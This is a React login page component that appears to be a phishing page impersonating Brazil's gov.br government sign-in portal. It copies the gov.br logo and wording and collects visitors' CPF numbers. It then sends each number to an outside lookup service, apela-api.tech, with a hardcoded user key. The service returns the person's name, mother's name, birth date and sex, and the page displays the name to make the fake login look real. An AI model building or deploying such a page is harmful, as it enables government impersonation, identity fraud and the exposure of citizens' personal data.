import React, { useState } from 'react';
import { Loader2, AlertCircle } from 'lucide-react';

interface CpfData {
  cpf: string;
  nome: string;
  mae: string;
  nascimento: string;
  sexo: string;
}

interface LoginPageProps {
  onLoginSuccess?: (userData: CpfData) => void;
}

const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
  const [cpf, setCpf] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string>('');

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 11) {
      value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
    setCpf(value);
    
    // Limpar erro quando o usuário começar a digitar
    if (error) {
      setError('');
    }
  };

  const fetchCpfData = async (cleanCpf: string) => {
    try {
      const response = await fetch(`https://apela-api.tech/?user=b1b0e7e6-3bd8-4aae-bcb0-2c03940c3ae9&cpf=${cleanCpf}`);
      const data = await response.json();
      
      if (data.status === 200 && data.nome) {
        return {
          cpf: data.cpf || cleanCpf,
          nome: data.nome,
          mae: data.mae || 'Não informado',
          nascimento: data.nascimento,
          sexo: data.sexo
        };
      } else {
        throw new Error('CPF não encontrado ou inválido. Verifique se o CPF está correto.');
      }
    } catch (error) {
      throw new Error('Erro ao consultar CPF. Verifique sua conexão e tente novamente.');
    }
  };

  const updateHeaderLoginButton = (userName: string) => {
    // Função para atualizar o botão de login no header
    if (typeof window !== 'undefined' && (window as any).updateHeaderLoginButton) {
      (window as any).updateHeaderLoginButton(userName);
    }
  };

  const handleContinue = async () => {
    if (cpf.length >= 14) {
      setIsLoading(true);
      setError('');
      
      try {
        const cleanCpf = cpf.replace(/\D/g, '');
        const userData = await fetchCpfData(cleanCpf);
        
        // Atualizar o botão de login no header com o nome do usuário
        updateHeaderLoginButton(userData.nome);
        
        // Chamar callback de sucesso se fornecido
        if (onLoginSuccess) {
          onLoginSuccess(userData);
        }
        
        // Redirecionar para a página inicial após um breve delay
        setTimeout(() => {
          window.location.href = '/';
        }, 1000);
        
      } catch (err) {
        setError(err instanceof Error ? err.message : 'Erro desconhecido');
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <div style={{
      margin: 0,
      padding: 0,
      boxSizing: 'border-box',
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
      backgroundColor: '#f8f9fa',
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column'
    }}>
      {/* Header */}
      <div style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '12px 20px',
        backgroundColor: 'white',
        borderBottom: '1px solid #e9ecef'
      }}>
        <div>
          <img 
            src="https://i.ibb.co/21f7m7H0/govbr.webp" 
            alt="Logo do gov.br" 
            style={{ height: '28px', width: 'auto', display: 'block' }}
          />
        </div>
        <div style={{ display: 'flex', gap: '12px', alignItems: 'center' }}>
          <button style={{
            background: 'none',
            border: 'none',
            color: '#0066cc',
            fontSize: '18px',
            cursor: 'pointer',
            padding: '4px'
          }}>
            <i className="fas fa-adjust"></i>
          </button>
          <button style={{
            background: 'none',
            border: 'none',
            color: '#0066cc',
            fontSize: '18px',
            cursor: 'pointer',
            padding: '4px'
          }}>
            <i className="fas fa-universal-access"></i>
          </button>
        </div>
      </div>

      {/* Main Container */}
      <div style={{
        flex: 1,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-start',
        paddingTop: '40px',
        paddingBottom: '40px'
      }}>
        <div style={{
          width: '100%',
          maxWidth: '380px',
          margin: '0 16px',
          backgroundColor: 'white',
          borderRadius: '8px',
          padding: '32px 24px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          border: '1px solid #e9ecef'
        }}>
          <h1 style={{
            fontSize: '20px',
            marginBottom: '24px',
            color: '#212529',
            fontWeight: '400',
            lineHeight: '1.4'
          }}>
            Identifique-se no gov.br com:
          </h1>
          
          <div style={{
            display: 'flex',
            alignItems: 'center',
            marginBottom: '16px',
            padding: '12px',
            backgroundColor: '#e3f2fd',
            borderRadius: '4px',
            border: '1px solid #bbdefb'
          }}>
            <div style={{
              backgroundColor: '#1976d2',
              color: 'white',
              width: '24px',
              height: '24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              borderRadius: '2px',
              marginRight: '12px',
              fontSize: '12px'
            }}>
             
            </div>
            <div style={{
              fontWeight: '500',
              color: '#1976d2',
              fontSize: '14px'
            }}>
              Número do CPF
            </div>
          </div>
          
          <p style={{
            margin: '0 0 20px 0',
            color: '#6c757d',
            fontSize: '14px',
            lineHeight: '1.4'
          }}>
            Digite seu CPF para <span style={{ fontWeight: '600', color: '#212529' }}>criar</span> ou <span style={{ fontWeight: '600', color: '#212529' }}>acessar</span> sua conta gov.br
          </p>
          
          <label style={{
            display: 'block',
            marginBottom: '8px',
            color: '#495057',
            fontSize: '14px',
            fontWeight: '500'
          }}>
            CPF
          </label>
          
          <input 
            type="text"
            style={{
              width: '100%',
              padding: '12px 16px',
              border: '1px solid #ced4da',
              borderRadius: '4px',
              fontSize: '16px',
              color: '#495057',
              boxSizing: 'border-box',
              backgroundColor: isLoading ? '#f8f9fa' : 'white',
              outline: 'none',
              transition: 'border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out'
            }}
            placeholder="Digite seu CPF"
            inputMode="numeric" 
            value={cpf}
            onChange={handleCpfChange}
            maxLength={14}
            disabled={isLoading}
            onFocus={(e) => {
              e.target.style.borderColor = '#80bdff';
              e.target.style.boxShadow = '0 0 0 0.2rem rgba(0, 123, 255, 0.25)';
            }}
            onBlur={(e) => {
              e.target.style.borderColor = '#ced4da';
              e.target.style.boxShadow = 'none';
            }}
          />
          
          {/* Error Message */}
          {error && (
            <div style={{
              marginTop: '12px',
              padding: '12px',
              backgroundColor: '#f8d7da',
              border: '1px solid #f5c6cb',
              borderRadius: '4px',
              display: 'flex',
              alignItems: 'flex-start'
            }}>
              <AlertCircle style={{ width: '16px', height: '16px', color: '#721c24', marginRight: '8px', marginTop: '2px', flexShrink: 0 }} />
              <p style={{ color: '#721c24', fontSize: '14px', margin: 0, lineHeight: '1.4' }}>{error}</p>
            </div>
          )}
          
          {/* Loading State */}
          {isLoading && (
            <div style={{
              marginTop: '12px',
              padding: '12px',
              backgroundColor: '#d1ecf1',
              border: '1px solid #bee5eb',
              borderRadius: '4px',
              display: 'flex',
              alignItems: 'center'
            }}>
              <Loader2 style={{ width: '16px', height: '16px', color: '#0c5460', marginRight: '8px' }} className="animate-spin" />
              <p style={{ color: '#0c5460', fontSize: '14px', margin: 0 }}>Verificando CPF e fazendo login...</p>
            </div>
          )}
          
          <button 
            disabled={cpf.length < 14 || isLoading}
            onClick={handleContinue}
            style={{
              width: '100%',
              padding: '12px 24px',
              backgroundColor: isLoading || cpf.length < 14 ? '#6c757d' : '#1976d2',
              color: 'white',
              border: 'none',
              borderRadius: '24px',
              fontSize: '16px',
              cursor: isLoading || cpf.length < 14 ? 'not-allowed' : 'pointer',
              marginTop: '20px',
              fontWeight: '500',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              transition: 'background-color 0.15s ease-in-out',
              outline: 'none'
            }}
            onMouseEnter={(e) => {
              if (!isLoading && cpf.length >= 14) {
                e.currentTarget.style.backgroundColor = '#1565c0';
              }
            }}
            onMouseLeave={(e) => {
              if (!isLoading && cpf.length >= 14) {
                e.currentTarget.style.backgroundColor = '#1976d2';
              }
            }}
          >
            {isLoading ? (
              <>
                <Loader2 style={{ width: '16px', height: '16px', marginRight: '8px' }} className="animate-spin" />
                Verificando...
              </>
            ) : (
              'Continuar'
            )}
          </button>

          <div style={{
            margin: '32px 0 20px',
            borderTop: '1px solid #dee2e6'
          }}></div>

          <p style={{
            fontSize: '14px',
            color: '#495057',
            marginBottom: '16px',
            fontWeight: '500'
          }}>
            Outras opções de identificação:
          </p>

          {/* QR Code Option */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            marginBottom: '12px',
            padding: '8px 0',
            cursor: 'pointer'
          }}>
            <div style={{
              width: '24px',
              height: '24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginRight: '12px',
              color: '#1976d2',
              fontSize: '16px'
            }}>
              <i className="fas fa-qrcode"></i>
            </div>
            <div style={{
              color: '#495057',
              fontSize: '14px'
            }}>
              Login com QR code
            </div>
          </div>

          {/* Digital Certificate Option */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            marginBottom: '12px',
            padding: '8px 0',
            cursor: 'pointer'
          }}>
            <div style={{
              width: '24px',
              height: '24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginRight: '12px',
              color: '#1976d2',
              fontSize: '16px'
            }}>
              <i className="fas fa-certificate"></i>
            </div>
            <div style={{
              color: '#495057',
              fontSize: '14px'
            }}>
              Seu certificado digital
            </div>
          </div>

          {/* Cloud Certificate Option */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            marginBottom: '12px',
            padding: '8px 0',
            cursor: 'pointer'
          }}>
            <div style={{
              width: '24px',
              height: '24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginRight: '12px',
              color: '#1976d2',
              fontSize: '16px'
            }}>
              <i className="fas fa-cloud"></i>
            </div>
            <div style={{
              color: '#495057',
              fontSize: '14px'
            }}>
              Seu certificado digital em nuvem
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;